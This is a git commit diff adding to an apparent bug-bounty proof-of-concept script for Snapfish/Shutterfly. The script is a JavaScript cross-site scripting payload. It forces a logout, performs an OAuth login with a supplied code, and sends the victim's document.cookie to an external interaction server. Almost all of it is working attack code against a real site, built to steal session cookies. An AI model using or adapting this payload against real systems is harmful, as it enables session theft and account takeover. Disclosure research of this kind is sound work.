6fb20bafb77ef3743391cc5ae0c783a2681c9f89
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2024-01-13 15:53:03 +0100

    Update snapfish4.js

--- poc/shutterfly/snapfish4.js
+++ poc/shutterfly/snapfish4.js
@@ -1,2 +1,12 @@
-confirm(parent.document.domain);
+alert(parent.document.domain);
+
+//Logout Attacker's Account
+navigator.sendBeacon("https://www.snapfish.com/logout","");
+
+//Login to Victim's Account using oAuth Login
+navigator.sendBeacon("https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=527231285582946&next=https%3A%2F%2Fwww.snapfish.com%2Fhome&SubscriptionFlag=ALL","");
+
+//Send cookie to Attacker Server
+var link="http://dmftkmghscwxjulluncuqmho9x6l6ujkt.oast.fun/VictimCookies="+document.cookie;
+navigator.sendBeacon(link,"");
 
